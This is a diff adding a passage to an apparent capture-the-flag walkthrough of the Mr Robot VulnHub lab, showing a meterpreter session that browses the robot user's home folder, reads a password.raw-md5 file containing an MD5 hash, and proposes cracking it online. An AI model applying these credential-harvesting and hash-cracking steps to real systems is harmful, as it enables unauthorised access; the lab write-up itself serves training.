@@ -2552,7 +2552,67 @@ meterpreter >
 ```
 
 <p></p>
-We have now gained access to the target VM! We can navigate around it 
+We have now gained access to the target VM! We can navigate around it, remember we have 2 more flags to find, one in the user folder and one in the root folder. Lets look for the user flag first, to start with navigate to the home directory and then look at the users:
+<p></p>
+
+```
+cd /home
+```
+
+<p></p>
+
+```
+meterpreter > ls
+Listing: /home
+==============
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40755/rwxr-xr-x  4096  dir   2015-11-13 18:20:08 +1100  robot
+```
+
+<p></p>
+We have found a user! lets go into his folder and have a look.
+<p></p>
+
+```
+meterpreter > cd robot
+meterpreter > ls
+Listing: /home/robot
+====================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100400/r--------  33    fil   2015-11-13 18:28:21 +1100  key-2-of-3.txt
+100644/rw-r--r--  39    fil   2015-11-13 18:28:21 +1100  password.raw-md5
+```
+
+<p></p>
+We have found another key! but if we try to open it we find we have a problem.
+<p></p>
+
+```
+meterpreter > cat key-2-of-3.txt
+[-] core_channel_open: Operation failed: 1
+```
+
+<p></p>
+Our problem is that we aren't currently the robot user, but that password file should help us!
+<p></p>
+
+```
+meterpreter > cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+<p></p>
+Now there are many ways we can go about cracking this hash, the quickest way is to go to <a href="https://crackstation.net/" rel="nofollow">CrackStation</a> and crack the hash online.
+<p></p>
+<div align="center">
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e013fb58f5002d89c977e8cec0e9d6eb86f3d11f/Starting_Point/VulnHub/MrRobot/images/insidereverse.png"><br>
+</div>
+<p></p>
+
 
 
 
